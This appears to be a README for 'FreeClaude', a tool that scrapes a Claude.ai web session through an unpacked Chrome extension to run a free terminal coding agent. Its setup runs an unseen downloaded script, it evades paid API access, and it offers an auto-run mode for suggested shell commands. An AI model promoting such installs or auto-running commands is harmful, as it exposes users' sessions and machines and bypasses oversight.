# FreeClaude

Claude Code, but free. Uses your Claude.ai account via a Chrome extension to give you an agentic coding assistant in your terminal — no API key, no cost.

## How it works

1. You type a message in the terminal
2. The extension types it into claude.ai and submits it
3. The response is scraped and streamed back to your terminal
4. Claude can suggest commands — you approve them and the output is sent back automatically

---

## Setup

### Download and unzip the source code: 
https://github.com/connorgentile113-png/FreeClaude/blob/main/rebuild.zip
### Or directly dowload it here:
https://github.com/connorgentile113-png/FreeClaude/raw/main/rebuild.zip

```bash
cd ~/Downloads/rebuild && bash setup.sh
```

Then:

1. Go to `chrome://extensions`
2. Enable **Developer Mode**
3. Click **Load unpacked**
4. Select:

```bash
~/freeclaude/extension
```

5. Open a new terminal and run:

```bash
freeclaude
```

The extension auto-connects to the server.

---

## Usage

| Command | Description |
|---|---|
| *(just type)* | Send a message to Claude |
| `y` | Run a suggested command |
| `n` | Skip a suggested command |
| `a` | Allow all commands (auto-run mode) |
| `allow` | Toggle auto-run mode |
| `exit` | Quit |

---

## Files

```text
~/freeclaude/
├── extension/     Chrome extension (load unpacked)
├── server/        Bridge server (localhost:3210)

~/.local/bin/
└── freeclaude     Terminal CLI
```

---

## Requirements

- macOS (tested on Apple Silicon and Intel)
- Node.js
- Chrome
- A free Claude.ai account
